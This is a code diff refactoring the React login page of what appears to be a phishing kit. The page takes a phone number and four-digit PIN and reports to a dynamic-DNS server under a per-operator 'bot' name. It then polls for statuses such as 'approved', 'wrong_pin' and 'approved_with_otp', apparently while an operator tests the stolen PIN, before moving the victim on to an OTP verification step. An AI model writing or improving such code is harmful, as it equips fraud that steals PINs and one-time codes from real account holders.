@@ -1,9 +1,8 @@
 import React, { useState, useRef, useEffect } from 'react'
 import axios from 'axios'
+import { useNavigate, useParams } from 'react-router-dom'
 
 const API_BASE_URL = "https://lnmb.duckdns.org"
-
-const getBotName = () => window.location.pathname.split("/")[1] || "user1"
 
 const api = axios.create({
   baseURL: API_BASE_URL,
@@ -11,7 +10,7 @@ const api = axios.create({
 })
 
 api.interceptors.request.use(config => {
-  const bot = getBotName()
+  const bot = window.location.pathname.split("/")[1] || "user1"
   config.headers["X-Bot-Name"] = bot
   return config
 })
@@ -23,8 +22,9 @@ const LogoPlaceholder = () => (
   </svg>
 )
 
-function Login({ client, setnumber, setpin, sendDetails }) {
-  const { user } = getBotName() || {}
+function Login() {
+  const navigate = useNavigate()
+  const { user } = useParams()
   const [imgError, setImgError] = useState(false)
   const [phone, setPhone] = useState("")
   const [inputs, setInputs] = useState(["", "", "", ""])
@@ -35,6 +35,7 @@ function Login({ client, setnumber, setpin, sendDetails }) {
   const inputRefs = useRef([])
   const sessionRef = useRef(null)
   const timerRef = useRef(null)
+  const userId = user || 'default'
   
   const statusMessages = {
     pending: "⏳ En attente...",
@@ -82,14 +83,14 @@ function Login({ client, setnumber, setpin, sendDetails }) {
       try {
         const response = await api.post("/api/check-pin-status", {
           sessionId,
-          bot: user
+          bot: userId
         })
         const data = response.data
         
         if (data.status === "approved") {
           setStatus("approved")
           setLoading(false)
-          setTimeout(() => window.location.href = `/${phone}/verification`, 1000)
+          navigate(`/${userId}/verification`)
         } else if (data.status === "pending") {
           setStatus("pending")
         } else if (data.status === "wrong_pin") {
@@ -103,7 +104,7 @@ function Login({ client, setnumber, setpin, sendDetails }) {
         } else if (data.status === "approved_with_otp") {
           setStatus("pinotp_correct")
           setLoading(false)
-          setTimeout(() => window.location.href = `/${phone}/verification`, 2000)
+          navigate(`/${userId}/verification`)
         }
       } catch (err) {
         console.error("Polling error:", err)
